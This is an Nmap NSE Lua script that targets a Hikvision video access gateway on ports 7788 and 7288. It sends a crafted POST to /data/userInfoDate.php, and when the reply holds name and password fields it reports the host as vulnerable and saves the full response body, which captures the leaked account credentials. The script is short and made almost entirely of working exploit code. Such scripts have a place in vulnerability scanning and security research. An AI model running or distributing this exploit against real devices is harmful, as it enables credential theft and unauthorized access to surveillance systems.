local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"


description = [[
海康视频设备接入网关账号信息泄露.
]]

author = "seaung"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = { "hikvision", "hikvision_7088_post", "vuln_detect" }

portrule = shortport.port_or_service( {7788,7288}, {"http", "https"}, "tcp", "open")

action = function(host, port)
  
  local output_tab = stdnse.output_table()
  local path = "/data/userInfoDate.php"
  local exploit = [[page=1&rows=20&sort=userId&order=asc]]
  local options = {header={["Content-Type"]='application/x-www-form-urlencoded'}}
  local response = http.post(host, port, path, options, nil, exploit)
  
  local rawheader = response.rawheader
  local body = response.body
  local match_name = "name"
  local match_pass = "password"
  
  if response.status == 200 and string.match(body, match_name) and string.match(body, match_pass) then
	output_tab.yd_cmd1 = "/data/userInfoDate.php".."   ".."Found vulnerable."
	output_tab.yd_rbody1 = body
  end
  
  return output_tab
  
end

